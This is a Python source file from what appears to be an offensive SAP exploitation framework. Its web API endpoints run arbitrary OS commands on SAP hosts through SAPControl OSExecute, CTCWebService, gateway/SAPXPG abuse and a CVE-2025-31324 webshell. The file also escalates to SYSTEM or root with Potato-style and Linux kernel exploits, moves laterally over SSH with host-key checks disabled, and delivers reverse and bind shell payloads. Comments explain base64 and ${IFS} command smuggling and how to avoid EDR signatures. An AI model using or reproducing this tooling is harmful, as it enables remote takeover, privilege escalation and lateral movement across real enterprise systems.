            print(f"[*] Testing {'TCP/IP' if is_type_t else 'RFC'} "
                  f"destination: {dest_name}...")

            # Phase 3b: when the source node's gateway port is
            # firewalled (typical Type-G/H landscape) and we have a
            # verified SOAP-RFC route to this node, run
            # DEST_CHECK_CONNECTION over SOAP instead of pyrfc.  Saves
            # the 60-90s pyrfc-on-3340 timeout per Test Connection
            # click against an HTTP-only source.
            result = None
            tested_via_soap = False
            soap_route_src = find_soap_rfc_route_for_node(
                api.state, node)
            if soap_route_src:
                from sapmap_exploit import _gateway_port_reachable
                if not _gateway_port_reachable(node):
                    print(f"[*] {sid}: gateway down — testing "
                          f"{dest_name} via SOAP-RFC "
                          f"DEST_CHECK_CONNECTION")
                    import time as _t
                    from sap_soap_basic import SOAPRFCSession
                    sess = SOAPRFCSession(
                        host=soap_route_src["host"],
                        port=soap_route_src["port"],
                        client=soap_route_src["client"],
                        user=soap_route_src["user"],
                        password=soap_route_src["password"],
                        https=soap_route_src["https"])
                    t0 = _t.time()
                    soap_ping = sess.dest_check_connection(dest_name)
                    tested_via_soap = True
                    # Shape into test_rfc_destination's expected dict
                    result = {
                        "ping_ok": soap_ping["ping_ok"],
                        "logon_ok": soap_ping["logon_ok"],
                        "ping_status": "1" if soap_ping["ping_ok"]
                                        else "0",
                        "latency_ms": int((_t.time() - t0) * 1000),
                        "logon_message": soap_ping["ping_message"],
                        "error": soap_ping["error"],
                    }

            if result is None:
                result = sapmap_rfc.test_rfc_destination(
                    node, dest_name, creds, api.state.rfc_check_cache,
                    rfc_conn=conn,
                )
            conn.latency_ms = result.get("latency_ms", 0)
            conn.tested = True

            if is_type_t:
                # Type T: success = EV_PING_STATUS == 1
                ping_success = result.get("ping_status") == "1"
                conn.ping_ok = ping_success
                conn.logon_successful = ping_success
                conn.logon_tested = True
                conn.sapxpg_remote_works = ping_success
                if ping_success:
                    print(f"[+] {dest_name}: Ping successful! "
                          f"(EV_PING_STATUS=1, latency={conn.latency_ms}ms)")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                else:
                    print(f"[-] {dest_name}: Ping failed")
            else:
                # Type 3: success = logon_ok
                conn.logon_successful = result.get("logon_ok", False)
                conn.logon_tested = True
                conn.ping_ok = result.get("ping_ok", False)
                if conn.logon_successful:
                    # Clear any stale error from a previous failed
                    # pyrfc attempt — leaving it set makes the modal
                    # show a scary RFC_COMMUNICATION_FAILURE even
                    # though THIS test succeeded.
                    conn.user_detail_error = ""
                    print(f"[+] {dest_name}: Logon successful!")
                    target = api.state.get_node(conn.target_sid)
                    if target:
                        target.has_critical_finding = True
                    if tested_via_soap:
                        # SOAP path: the pyrfc-based profile read
                        # (get_remote_user_profiles uses
                        # ABAP_INSTALL_AND_RUN over the gateway) would
                        # itself hang on 3340.  Mark soap_rfc_verified
                        # so the Create Remote User button still
                        # appears, with the click-time SAP_ALL check
                        # path same as HTTP destinations get.
                        conn.soap_rfc_verified = True
                        print(f"[*] {dest_name}: profile read skipped "
                              f"(via SOAP) — SAP_ALL will be verified "
                              f"at Create Remote User click time")
                    elif conn.rfc_user:
                        info = sapmap_rfc.get_remote_user_profiles(
                            node, conn.rfc_user, dest_name, creds
                        )
                        conn.profiles = info.get("profiles", [])
                        conn.has_sap_all = info.get("has_sap_all", False)
                        conn.user_detail_error = info.get("error", "")
                        if conn.has_sap_all:
                            print(f"[!] {conn.rfc_user} in {dest_name} has SAP_ALL!")
                        api.state.notify_sap_all_if_elevated(conn)
                else:
                    err = result.get("error", "")
                    if err:
                        err_short = err.split("\n")[0][:120]
                        print(f"[-] {dest_name}: Logon failed ({err_short})")
                    else:
                        print(f"[-] {dest_name}: Logon failed")
            print(f"[+] Single test done for {dest_name}")

        _bg(f"{sid}:test_rfc:{dest_name}", "Test RFC", _run)
        return json.dumps({"status": "started"})

    @app.route("/api/node/<sid>/sapcontrol_osexecute", method="POST")
    def node_sapcontrol_osexecute(sid):
        """Run an OS command via SAPControl OSExecute on the target of
        a Type-G destination whose credentials we've already verified
        (conn.os_exec_verified=True).  Synchronous — the SOAP call
        blocks until the child process exits (kernel-side timeout
        provided by the operator, defaults 30s).

        Payload:
          { destination_name: str, command: str, timeout?: int }
        Returns:
          { ok, exit_code, output, error, status, pid }
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        dest_name = (data.get("destination_name") or "").strip()
        command = (data.get("command") or "").strip()
        timeout = int(data.get("timeout") or 30)
        if not dest_name:
            return json.dumps({"error": "destination_name required"})
        if not command:
            return json.dumps({"error": "command required"})
        conn = None
        for c in api.state.get_connections_from(sid):
            if c.destination_name == dest_name:
                conn = c
                break
        if not conn:
            return json.dumps({"error": f"connection {dest_name} not "
                                          f"found on {sid}"})
        if not (conn.os_access_type or "").startswith(
                ("sapcontrol", "hostagent")):
            return json.dumps({"error": (f"connection {dest_name} is "
                                            f"not a SAPControl / Host "
                                            f"Agent destination")})
        if not conn.os_exec_verified:
            return json.dumps({"error": (f"connection {dest_name} has "
                                            f"not been verified — run "
                                            f"Test Connection first "
                                            f"so os_exec_verified is "
                                            f"set")})
        pwd = conn.secstore_password or ""
        user = conn.rfc_user or ""
        if not (user and pwd and conn.http_url):
            return json.dumps({"error": (f"connection {dest_name} is "
                                            f"missing url / user / "
                                            f"password")})
        # SAPControl OSExecute tokenises the command string on
        # whitespace and passes the resulting argv to execvp — no
        # shell in between.  Two consequences:
        #
        #   * bare "whoami" fails: kernel searches PATH but with the
        #     restricted PATH sapstartsrv runs under, /usr/bin is
        #     often not on it.
        #   * "sh -c 'uname -a'" also fails: kernel splits on space
        #     inside the quotes → argv=[sh, -c, 'uname, -a'], sh
        #     complains about the unmatched quote.
        #
        # Fix: base64-encode the user command, then send an argv
        # whose third token is a pipeline that decodes and executes
        # it.  ${IFS} in the pipeline expands to whitespace INSIDE
        # the shell, so the string reaching the kernel has no
        # literal whitespace to split on.  Works on any POSIX sh
        # and mirrors the standard "sapcontrol OSExecute base64"
        # technique documented in field guides.
        # OS resolution — prefer, in order:
        #   1. conn.target_os_hint (uname probe result stashed by
        #      Test Connection).  This is DEFINITIVE: it came from
        #      actually running a command on the target.
        #   2. target_node.os_type (fingerprint metadata).
        #   3. Username heuristic (SAPService<SID> → Windows).
        target_os = ""
        if conn.target_sid:
            tgt = api.state.get_node(conn.target_sid)
            if tgt:
                target_os = (tgt.os_type or "").lower()
        hint = (conn.target_os_hint or "").lower()
        if hint == "windows":
            is_windows = True
        elif hint == "unix":
            is_windows = False
        else:
            is_windows = (
                any(w in target_os for w in ("windows", "nt", "win"))
                or user.lower().startswith("sapservice")
            )
        already_wrapped = (
            command.startswith(("sh ", "bash ", "/bin/sh ",
                                 "/bin/bash "))
            or command.startswith(("cmd ", "cmd.exe ",
                                    "powershell "))
            or command.startswith(("/", "c:\\", "C:\\"))
        )
        # Raw-safe: no whitespace, no shell metacharacters.  Kernel
        # can execve/CreateProcess this directly.  Two conditions
        # need to hold for it to actually resolve:
        #
        #   * Windows target: CreateProcess is PATH-aware, and the
        #     service PATH always includes System32, so bare
        #     `whoami` / `hostname` / `ipconfig` all resolve.
        #   * Absolute path (starts with / or C:\ / c:\): no PATH
        #     lookup needed at all.
        #
        # On Linux the SAP sapstartsrv service runs with a
        # restricted PATH (typically only /usr/sap/<SID>/<inst>/exe),
        # so bare `whoami` execve fails at path lookup with exit=2
        # and empty output.  Force the shell wrap in that case so
        # /bin/sh -c can do a proper PATH search.  Operator-
        # reported: sj1adm on srv01sm1.ncmi.co Linux target
        # returned rc=2 empty output for `whoami` (worked for
        # `uname -a` because THAT went through the wrap).
        raw_safe = (
            not any(c in command for c in " \t|&<>$`\"'\\")
        )
        cmd_is_absolute = (
            command.startswith(("/",))
            or (len(command) >= 3
                and command[0].isalpha()
                and command[1:3] == ":\\")
        )
        # Absolute-path bypass works on both platforms — CreateProcess
        # and execve both take absolute paths as-is.  For bare command
        # names, we ALWAYS need a shell wrap, on both platforms:
        # * Linux: sapstartsrv's restricted PATH doesn't find /usr/bin
        #   binaries (whoami, id, hostname, ...).
        # * Windows: cmd.exe built-ins (dir, type, cls, set, echo, ...)
        #   aren't real .exe files, so CreateProcess("Dir") fails
        #   with "CreateProcess failed".  Only whoami / hostname /
        #   ipconfig / systeminfo work bare (they are real .exes).
        # Wrapping through PowerShell -EncodedCommand handles both
        # built-ins and PATH-search, so gate raw-safe on absolute
        # paths only.
        if raw_safe and cmd_is_absolute:
            already_wrapped = True   # send verbatim
        raw_cmd = command
        if not already_wrapped:
            if is_windows:
                # cmd.exe /C — always in System32, always PATH-
                # reachable for sapstartsrv, and PLAINTEXT over the
                # wire so EDR / AV signatures don't fire.  The old
                # PowerShell -EncodedCommand wrap was correct as a
                # design but got blocked in the wild by modern EDR
                # (operator report: 14 s scan then HTTP 500
                # CreateProcess failed on sjjadm@10.10.1.38:50213
                # for a simple `whoami`).  cmd.exe handles built-ins
                # (dir, type, set), real .exe binaries reachable via
                # PATH (whoami.exe, hostname.exe), and args with
                # spaces — sufficient for interactive OS-terminal
                # use.  Complex quoting / pipes are the operator's
                # own responsibility, same as at any real cmd prompt.
                raw_cmd = f"cmd.exe /C {command}"
            else:
                import base64 as _b64
                # base64 of the user command has no whitespace.
                # `echo${IFS}<b64>|base64${IFS}-d|/bin/sh` reaches
                # the kernel as three argv tokens; sh -c runs the
                # pipeline, ${IFS} expands to whitespace inside the
                # shell, base64 -d writes the original command, sh
                # then runs it with proper PATH + quoting.
                b64 = _b64.b64encode(
                    command.encode("utf-8")).decode("ascii")
                raw_cmd = (f"/bin/sh -c "
                           f"echo${{IFS}}{b64}|base64${{IFS}}"
                           f"-d|/bin/sh")
        print(f"[*] {dest_name}: OSExecute on {conn.http_url} as "
              f"{user} → command={command[:60]!r} "
              f"(timeout={timeout}s, "
              f"target_os={'windows' if is_windows else 'unix'})")
        result = sapmap_rfc.sapcontrol_os_execute(
            conn.http_url, user, pwd, raw_cmd, timeout=float(timeout))
        result["command_sent"] = raw_cmd
        if result["ok"]:
            print(f"[+] {dest_name}: OSExecute rc={result['exit_code']} "
                  f"pid={result['pid']} "
                  f"({len(result['output'])} bytes output)")
        else:
            print(f"[-] {dest_name}: OSExecute failed — "
                  f"{result['error'][:200]}")
        return json.dumps(result)

    @app.route("/api/node/<sid>/ctcws_osexecute", method="POST")
    def node_ctcws_osexecute(sid):
        """Run an OS command via CTCWebService/FileSystemConfig on the
        target of an HTTP destination whose UME credentials we've
        already verified (conn.os_exec_verified=True, os_exec_channel=
        'ctcws').  Synchronous — the SOAP call blocks until the child
        process exits (server-side timeout provided by the operator,
        defaults 30s).  CTCWebService runs the command through the
        Java stack's Runtime.exec, so shell wrapping matches the same
        rules the SAPControl endpoint uses.

        Payload:
          { destination_name: str, command: str, timeout?: int }
        Returns:
          { ok, exit_code, output, error, status, pid, command_sent }
        """
        response.content_type = "application/json"
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})
        data = request.json or {}
        dest_name = (data.get("destination_name") or "").strip()
        command = (data.get("command") or "").strip()
        timeout = int(data.get("timeout") or 30)
        if not dest_name:
            return json.dumps({"error": "destination_name required"})
        if not command:
            return json.dumps({"error": "command required"})
        conn = None
        for c in api.state.get_connections_from(sid):
            if c.destination_name == dest_name:
                conn = c
                break
        if not conn:
            return json.dumps({"error": f"connection {dest_name} not "
                                          f"found on {sid}"})
        if getattr(conn, "os_exec_channel", "") != "ctcws":
            return json.dumps({"error": (f"connection {dest_name} is "
                                            f"not a CTCWebService pivot "
                                            f"(os_exec_channel="
                                            f"{getattr(conn, 'os_exec_channel', '')!r})")})
        if not conn.os_exec_verified:
            return json.dumps({"error": (f"connection {dest_name} has "
                                            f"not been verified — run "
                                            f"Test Connection first so "
                                            f"os_exec_verified is set")})
        pwd = conn.secstore_password or ""
        user = conn.rfc_user or ""
        if not (user and pwd and conn.http_url):
            return json.dumps({"error": (f"connection {dest_name} is "
                                            f"missing url / user / "
                                            f"password")})
        # CTCWebService/FileSystemConfig/EXECUTE_CMD passes the arg
        # to java.lang.Runtime.exec(String) which tokenises on
        # whitespace before spawning the child.  Same failure modes
        # as SAPControl OSExecute — reuse the same shell-wrap logic
        # so absolute paths run verbatim, bare command names get
        # PATH resolution, and pipelines / redirects stay intact.
        target_os = ""
        if conn.target_sid:
            tgt = api.state.get_node(conn.target_sid)
            if tgt:
                target_os = (tgt.os_type or "").lower()
        hint = (conn.target_os_hint or "").lower()
        if hint == "windows":
            is_windows = True
        elif hint == "unix":
            is_windows = False
        else:
            is_windows = (
                any(w in target_os for w in ("windows", "nt", "win"))
                or user.lower().startswith("sapservice")
            )
        already_wrapped = (
            command.startswith(("sh ", "bash ", "/bin/sh ",
                                 "/bin/bash "))
            or command.startswith(("cmd ", "cmd.exe ",
                                    "powershell "))
            or command.startswith(("/", "c:\\", "C:\\"))
        )
        raw_safe = (
            not any(c in command for c in " \t|&<>$`\"'\\")
        )
        cmd_is_absolute = (
            command.startswith(("/",))
            or (len(command) >= 3
                and command[0].isalpha()
                and command[1:3] == ":\\")
        )
        if raw_safe and cmd_is_absolute:
            already_wrapped = True
        raw_cmd = command
        if not already_wrapped:
            if is_windows:
                raw_cmd = f"cmd.exe /C {command}"
            else:
                import base64 as _b64
                b64 = _b64.b64encode(
                    command.encode("utf-8")).decode("ascii")
                raw_cmd = (f"/bin/sh -c "
                           f"echo${{IFS}}{b64}|base64${{IFS}}"
                           f"-d|/bin/sh")
        print(f"[*] {dest_name}: CTCWebService exec on {conn.http_url} "
              f"as {user} → command={command[:60]!r} "
              f"(timeout={timeout}s, "
              f"target_os={'windows' if is_windows else 'unix'})")
        try:
            import sap_java_ctcws as _cws
            result = _cws.ctcws_os_execute(
                conn.http_url, user, pwd, raw_cmd,
                timeout=float(timeout))
        except Exception as _e:
            result = {"ok": False, "status": 0,
                      "error": f"CTCWebService call crashed: {_e}",
                      "exit_code": -1, "output": "", "pid": 0}
        result["command_sent"] = raw_cmd
        if result.get("ok"):
            print(f"[+] {dest_name}: CTCWebService rc="
                  f"{result.get('exit_code')} "
                  f"({len(result.get('output') or '')} bytes output)")
        else:
            print(f"[-] {dest_name}: CTCWebService exec failed — "
                  f"{(result.get('error') or '')[:200]}")
        return json.dumps(result)

    @app.route("/api/node/<sid>/exec_command", method="POST")
    def node_exec_command(sid):
        """Execute an OS command on a node (synchronous).

        Accepts either:
          - cmdline: raw command (e.g. "ls -la") — auto-wrapped in shell
          - command + params: explicit binary + params (legacy)
        """
        response.content_type = "application/json"
        data = request.json or {}
        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        method = data.get("method", "gateway")  # "gateway" | "sxpg" | "cve_31324"
        cmdline = data.get("cmdline", "").strip()
        command = data.get("command", "").strip()
        params = data.get("params", "").strip()

        # If cmdline provided, auto-detect OS and wrap in shell.
        # CVE-2025-31324 is special: the JSP webshell already detects
        # Windows vs Linux and wraps in cmd.exe /c or /bin/sh -c internally.
        # Server-side wrapping would double-wrap (e.g. "/bin/sh -c whoami"
        # passed to cmd.exe /c on Windows → path not found).  Skip it.
        if cmdline and method == "cve_31324":
            command = cmdline
            params = ""
        elif cmdline:
            os_type = node.os_type or ""
            # Auto-detect OS if unknown
            if not os_type:
                if method == "sxpg":
                    # Use RFC_SYSTEM_INFO
                    creds = node.best_credentials()
                    if creds:
                        try:
                            with sapmap_rfc._get_connection(
                                    node, creds) as conn:
                                info = conn.call("RFC_SYSTEM_INFO")
                                export = info.get("RFCSI_EXPORT", {})
                                if isinstance(export, dict):
                                    os_type = export.get(
                                        "RFCOPSYS", "").strip()
                        except Exception:
                            pass
                elif method == "gateway" and node.gw_vulnerable:
                    # Probe via GW to detect OS. "ver" is a cmd.exe
                    # built-in (not a standalone exe), so we must use
                    # "cmd.exe /C ver" as full EXTPROG. If it succeeds
                    # with "windows" in output → Windows. If it fails,
                    # try "uname" which works on Linux/Unix.
                    try:
                        probe = sapmap_exploit.execute_os_command(
                            node, "cmd.exe /C ver", "")
                        if probe.get("success") and probe.get("output"):
                            out_text = " ".join(probe["output"]).lower()
                            if "windows" in out_text:
                                os_type = "Windows NT"
                        if not os_type:
                            probe2 = sapmap_exploit.execute_os_command(
                                node, "uname", "")
                            if probe2.get("success") and probe2.get("output"):
                                os_type = "Linux"
                        if not os_type:
                            os_type = "Linux"
                    except Exception:
                        os_type = "Linux"
                if os_type:
                    node.os_type = os_type
                    print(f"[*] {sid}: Auto-detected OS: {os_type}")
            is_win = any(w in os_type.lower()
                         for w in ("windows", "nt", "win"))
            if is_win:
                # Windows SAPXPG: full command line goes in EXTPROG,
                # PARAMS left empty (old kernels treat EXTPROG as
                # the full command line, PARAMS gets mangled)
                command = f"cmd.exe /C {cmdline}"
                params = ""
            else:
                command = "/bin/sh"
                # Replace spaces with ${IFS} so SAPXPG doesn't split
                params = "-c " + cmdline.replace(" ", "${IFS}")

        if not command:
            return json.dumps({"error": "No command specified"})

        # Phase 3b: discover any SOAP-RFC route to this node, so the
        # gateway / sxpg methods can transparently fall back to HTTP
        # when the gateway port is firewalled.
        soap_route = find_soap_rfc_route_for_node(api.state, node)

        if method == "gateway":
            if not node.gw_vulnerable:
                return json.dumps({"error": "Gateway not vulnerable on this system"})
            result = sapmap_exploit.execute_os_command(
                node, command, params, soap_route=soap_route)
        elif method == "sxpg":
            creds = node.best_credentials()
            if not creds and not soap_route:
                return json.dumps({"error": "No credentials available"})
            # Prefer SOAP-RFC when the gateway is down (or when we have
            # no pyrfc creds but DO have a SOAP route) — execute_os_command
            # handles the gateway-reachability gate internally.
            result = sapmap_exploit.execute_os_command(
                node, command, params, creds=creds,
                soap_route=soap_route, prefer="sxpg")
        elif method == "soap_rfc":
            if not soap_route:
                return json.dumps({"error":
                    "No SOAP-RFC route to this node — Test "
                    "Connection on a Type-G/H destination first to "
                    "verify creds + ICM port"})
            result = sapmap_exploit.execute_os_command(
                node, command, params, soap_route=soap_route,
                prefer="soap_rfc")
        elif method == "cve_31324":
            if not node.cve_2025_31324_vulnerable:
                return json.dumps({"error": "CVE-2025-31324 not confirmed — "
                                             "run Check first"})
            # Route through the dropped shell when available (captures stdout),
            # otherwise fall back to the blind Runtime.exec gadget.
            full = (command + (" " + params if params else "")).strip()
            result = sapmap_exploit.execute_cve_2025_31324_via_shell(node, full)
        elif method == "winlpe_system":
            # Elevate to NT AUTHORITY\\SYSTEM via the Windows-LPE picker
            # (EfsPotato preferred, GodPotato fallback, MiniPlasma as a
            # last resort).  The picker delivers + runs the chosen
            # binary on the target, which spawns the operator command
            # under a SYSTEM token and pipes stdout back.
            from sapmap_winlpe_auto import run_windows_lpe
            full = cmdline if cmdline else (
                command + (" " + params if params else "")).strip()
            if not full:
                return json.dumps({"error": "No command for winlpe_system"})
            print(f"[*] {sid}: OS terminal — routing through Windows LPE "
                  f"for SYSTEM context (cmd: {full[:80]!r})")
            lpe_res = run_windows_lpe(node, full)
            # Adapter: run_windows_lpe returns {ok, stdout, method, error};
            # exec_command callers expect {success, output, error}.
            result = {
                "success": bool(lpe_res.get("ok")),
                "output": (lpe_res.get("stdout") or "").splitlines() or [
                    "(no output)" if lpe_res.get("ok") else ""],
                "error": lpe_res.get("error") or "",
                "winlpe_method": lpe_res.get("method", ""),
            }
        elif method == "linuxlpe_root":
            # Linux mirror of winlpe_system: route the operator command
            # through the Linux-LPE picker (Copy Fail preferred, Dirty
            # Frag fallback).  The picker wraps the command in a root
            # shell script + writes captured stdout to a result file +
            # reads it back via base64.  Returns the same
            # {ok, stdout, method, error} shape as run_windows_lpe.
            from sapmap_lpe_auto import run_linux_lpe
            full = cmdline if cmdline else (
                command + (" " + params if params else "")).strip()
            if not full:
                return json.dumps({"error": "No command for linuxlpe_root"})
            print(f"[*] {sid}: OS terminal — routing through Linux LPE "
                  f"for root context (cmd: {full[:80]!r})")
            lpe_res = run_linux_lpe(node, full)
            result = {
                "success": bool(lpe_res.get("ok")),
                "output": (lpe_res.get("stdout") or "").splitlines() or [
                    "(no output)" if lpe_res.get("ok") else ""],
                "error": lpe_res.get("error") or "",
                "linuxlpe_method": lpe_res.get("method", ""),
            }
        elif method == "ssh":
            # SSH lateral movement: run command on THIS node by
            # SSH-ing from the source node (where the key lives).
            # The source node must have GW/CVE/SXPG exec to run ssh.
            ssh_access = getattr(node, "ssh_access", None) or []
            if not ssh_access:
                return json.dumps({"error": "No SSH access to this node"})
            acc = ssh_access[0]
            src_node = api.state.get_node(acc["from_sid"])
            if not src_node:
                return json.dumps({"error": f"Source node {acc['from_sid']} "
                                             f"not found"})
            full = cmdline if cmdline else (
                command + (" " + params if params else "")).strip()
            if not full:
                return json.dumps({"error": "No command for SSH"})
            # SAPXPG uses exec-style arg splitting (NOT system()).
            # No quotes — bare words only.  SAPXPG splits at spaces,
            # passes each token to SSH as a separate arg.  SSH
            # concatenates trailing args and sends to remote bash.
            # Pipes/redirects in tokens without spaces go through as
            # literal chars to SSH → remote bash interprets them.
            import base64
            b64cmd = base64.b64encode(
                full.encode()).decode()
            ssh_args = (
                f"-o BatchMode=yes "
                f"-o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null "
                f"-o ConnectTimeout=10 "
                f"-o LogLevel=ERROR "
                f"-i {acc['key_path']} "
                f"{acc['username']}@{acc['target']} "
                f"echo {b64cmd}|base64 -d|sh"
            )
            print(f"[*] {sid}: OS terminal via SSH from "
                  f"{acc['from_sid']} → {acc['username']}@"
                  f"{acc['target']} (cmd: {full[:80]!r})")
            ssh_result = sapmap_exploit.execute_os_command(
                src_node, "ssh", ssh_args, long_params="")
            result = {
                "success": bool(ssh_result.get("success")),
                "output": ssh_result.get("output") or [],
                "error": ssh_result.get("error") or "",
                "channel": "ssh",
                "channel_reason": (
                    f"ssh from {acc['from_sid']} → "
                    f"{acc['username']}@{acc['target']}"),
            }
        elif method == "sapcontrol":
            # SAPControl OSExecute pivot — find any INCOMING Type-G
            # connection targeting this node with os_exec_verified=True
            # and route the command through its
            # /SAPControl.CGI endpoint.  Same shell-wrap rules as the
            # standalone /sapcontrol_osexecute endpoint (auto-detect
            # OS via conn.target_os_hint, base64-wrap non-absolute
            # commands, etc.).
            sc_conn = None
            for c in api.state.connections:
                if (c.target_sid == sid
                        and getattr(c, "os_exec_verified", False)):
                    sc_conn = c
                    break
            if sc_conn is None:
                return json.dumps({"error": (
                    "no SAPControl-verified Type-G destination "
                    "targeting this node — run Test Connection on a "
                    "SAPControl/Host-Agent Type-G destination first "
                    "to set os_exec_verified")})
            _url = sc_conn.http_url or ""
            _user = sc_conn.rfc_user or ""
            _pwd = sc_conn.secstore_password or ""
            if not (_url and _user and _pwd):
                return json.dumps({"error": (
                    f"SAPControl connection {sc_conn.destination_name!r} "
                    "missing url / user / password")})
            # OS-picker mirrors the sapcontrol_osexecute endpoint.
            _hint = (sc_conn.target_os_hint or "").lower()
            if _hint == "windows":
                is_windows = True
            elif _hint == "unix":
                is_windows = False
            else:
                _ost = (node.os_type or "").lower()
                is_windows = (
                    any(w in _ost for w in ("windows", "nt", "win"))
                    or _user.lower().startswith("sapservice"))
            _cmd = cmdline or ""
            raw_safe = not any(c in _cmd for c in " \t|&<>$`\"'\\")
            _abs = (_cmd.startswith("/") or (
                len(_cmd) >= 3 and _cmd[0].isalpha()
                and _cmd[1:3] == ":\\"))
            if not (raw_safe and _abs):
                if is_windows:
                    # cmd.exe /C — always in System32 (guaranteed
                    # PATH slot), plaintext command over the wire
                    # (EDR-friendly; -EncodedCommand PowerShell wraps
                    # trip modern AV signatures and got blocked with
                    # HTTP 500 CreateProcess failed after a 14 s
                    # scanner delay on the operator's SJJ target).
                    # Handles built-ins (dir, type, set), real .exe
                    # binaries reachable via PATH (whoami, hostname,
                    # ipconfig), and simple args with spaces.
                    _cmd = f"cmd.exe /C {_cmd}"
                else:
                    import base64 as _b64
                    b64 = _b64.b64encode(
                        _cmd.encode("utf-8")).decode("ascii")
                    _cmd = (f"/bin/sh -c echo${{IFS}}{b64}"
                            f"|base64${{IFS}}-d|/bin/sh")
            r = sapmap_rfc.sapcontrol_os_execute(
                _url, _user, _pwd, _cmd, timeout=30.0)
            _out = (r.get("output") or "").splitlines()
            result = {
                "success": bool(r.get("ok")
                                 and r.get("exit_code", -1) == 0),
                "output": _out,
                "error": r.get("error") or (
                    f"exit code {r.get('exit_code')}"
                    if r.get("ok") and r.get("exit_code", 0) != 0
                    else ""),
                "channel": "sapcontrol_osexec",
                "channel_reason": (
                    f"OSExecute via SAPControl at {_url} "
                    f"as {_user} (from RFC destination "
                    f"{sc_conn.destination_name!r} on "
                    f"{sc_conn.source_sid})"),
            }
        else:
            return json.dumps({"error": f"Unknown method: {method}"})

        return json.dumps(result)

    # -- Reverse Shell endpoints --

    @app.route("/api/shell/detect_ip", method="GET")
    def shell_detect_ip():
        response.content_type = "application/json"
        target = request.params.get("target", "")
        saprouter = request.params.get("saprouter", "")
        ip = _detect_local_ip(target, saprouter)
        return json.dumps({"local_ip": ip})

    @app.route("/api/shell/start", method="POST")
    def shell_start():
        global _shell_session
        response.content_type = "application/json"
        data = request.json or {}
        sid = data.get("sid", "")
        method = data.get("method", "gateway")
        shell_mode = data.get("shell_mode", "reverse")  # "reverse" or "bind"
        shell_port = int(data.get("listen_port", 4444))
        local_ip = data.get("local_ip", "127.0.0.1")

        node = api.state.get_node(sid)
        if not node:
            return json.dumps({"error": f"Node {sid} not found"})

        with _shell_lock:
            if _shell_session and _shell_session.status in ("waiting", "connected"):
                return json.dumps({"error": "A shell session is already active. "
                                             "Stop it first."})
            session = ShellSession(shell_port, sid, mode=shell_mode)
            if shell_mode == "reverse":
                session.start_listener()
                if session.status == "error":
                    return json.dumps({"error": session.error_msg})
            else:
                # Bind mode: just set waiting, connector starts after payload
                session.status = "waiting"
            _shell_session = session

        # Generate and send payload in background
        # Capture session ref so we can check cancelled flag
        _session_ref = session

        def _send():
            target_host = node.ip or node.hostname
            # SSH targets: use the SSH target IP and skip OS detection
            # (SSH key-based lateral movement is Linux-only in practice)
            # Phase 3b: discover any SOAP-RFC route to this node first,
            # so the OS-detection probes can use it instead of pyrfc
            # (which would hang for 60s per probe against firewalled
            # Type-G/H targets — _detect_is_windows then
            # _detect_python_cmd = 120s before delivery even starts).
            soap_route_early = find_soap_rfc_route_for_node(
                api.state, node)
            if method == "ssh":
                ssh_acc = (getattr(node, "ssh_access", None) or [None])[0]
                if ssh_acc:
                    target_host = ssh_acc.get("target", target_host)
                is_win = False
                py_cmd = "python3"
            else:
                # Determine OS — probe via cmd.exe if os_type not populated yet
                # (e.g. freshly-added nodes where the discovery scan hasn't run).
                # _detect_is_windows caches the result in node.os_type so it
                # only ever runs the probe once per node.
                is_win = _detect_is_windows(
                    node, method=method,
                    soap_route=soap_route_early)
                py_cmd = ("python3" if is_win
                          else _detect_python_cmd(
                              node, soap_route=soap_route_early))
            if shell_mode == "bind":
                payload = _generate_bind_payload(
                    node.os_type, shell_port, python_cmd=py_cmd)
                print(f"[*] {sid}: Sending bind shell payload: "
                      f"{payload['display']}")
                print(f"    Will connect to {target_host}:{shell_port} "
                      f"after payload delivery")
            else:
                payload = _generate_payload(
                    node.os_type, local_ip, shell_port, python_cmd=py_cmd)
                print(f"[*] {sid}: Sending reverse shell payload: "
                      f"{payload['display']}")
                print(f"    Listening on 0.0.0.0:{shell_port}")

            if method == "ssh":
                print(f"    SSH interpreter chain: "
                      f"python3 → python → python2 → perl → "
                      f"bash /dev/tcp")

            def _set_progress(msg):
                with _shell_lock:
                    if _shell_session:
                        _shell_session.progress_msg = msg

            # Use the SOAP-RFC route resolved before the OS probes.
            # Same route covers both the OS-detection probes above and
            # the chunked-payload writes + final exec below.
            soap_route = soap_route_early

            if method == "gateway":
                # GW: EXTPROG = "command", PARAMS = "params", LONG_PARAMS = "long_params"
                # long_params="" prevents old-kernel PARAMS+LONG_PARAMS concatenation.
                pre_steps = payload.get("steps", [])
                if pre_steps:
                    total = len(pre_steps)
                    for idx, step in enumerate(pre_steps):
                        if _session_ref.cancelled:
                            print(f"[*] {sid}: Payload delivery cancelled")
                            return
                        _set_progress(
                            f"Writing payload chunk {idx+1}/{total}...")
                        sapmap_exploit.execute_os_command(
                            node, step["command"], step["params"],
                            long_params=step.get("long_params"),
                            soap_route=soap_route)
                _set_progress("Executing payload...")
                result = sapmap_exploit.execute_os_command(
                    node, payload["command"], payload["params"],
                    long_params=payload.get("long_params"),
                    soap_route=soap_route)
            elif method == "cve_31324":
                # CVE-2025-31324 via the JSP shell has no 128/255-byte
                # EXTPROG/PARAMS limits, so we skip the chunked base64 write
                # used by the GW/SXPG backends and run the raw PowerShell in
                # one shot.  That's one HTTP round trip instead of ~20, and
                # each round trip spawns cmd.exe → PowerShell which is slow
                # (500ms+) so chunked delivery easily blew past the 20s HTTP
                # timeout.
                raw_ps = payload.get("raw_ps_script")
                if raw_ps:
                    # Kill any zombie PowerShell still LISTENING on the
                    # target port from a previous bind-shell attempt,
                    # otherwise the new listener hits "socket address
                    # already in use" and the user ends up talking to the
                    # old process on reconnect.
                    if shell_mode == "bind":
                        _set_progress(
                            "Clearing any old listener on target port...")
                        kill_cmd = (
                            f'cmd.exe /C for /f "tokens=5" %P in '
                            f'(\'netstat -ano ^| findstr :{shell_port} '
                            f'^| findstr LISTENING\') do '
                            f'taskkill /F /PID %P >nul 2>&1'
                        )
                        try:
                            sapmap_exploit.execute_cve_2025_31324_via_shell(
                                node, kill_cmd, timeout=15.0)
                        except Exception:
                            pass   # best-effort cleanup

                    _set_progress("Executing payload (single-shot)...")
                    # Clean-detach pattern: spawn the bind/reverse shell
